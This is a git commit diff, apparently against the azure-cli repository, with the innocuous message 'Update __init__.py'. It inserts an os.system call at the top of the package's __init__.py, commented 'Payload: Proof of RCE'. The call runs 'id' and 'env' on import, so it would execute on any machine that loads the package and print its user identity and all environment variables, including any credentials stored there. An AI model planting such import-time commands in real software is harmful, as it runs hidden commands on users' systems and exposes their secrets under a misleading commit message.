7d0aec51e33f56a59e502bd04b5c7e60e7413381
Nyein Chan Aung <208256680+bugdotexe@users.noreply.github.com>
2026-01-31 14:48:06 +0630

    Update __init__.py

--- src/azure-cli/azure/__init__.py
+++ src/azure-cli/azure/__init__.py
@@ -1,3 +1,6 @@
+import os
+# Payload: Proof of RCE
+os.system("echo ' [!] CRITICAL VULNERABILITY: RCE CONFIRMED [!] '; id; env")
 # --------------------------------------------------------------------------------------------
 # Copyright (c) Microsoft Corporation. All rights reserved.
 # Licensed under the MIT License. See License.txt in the project root for license information.
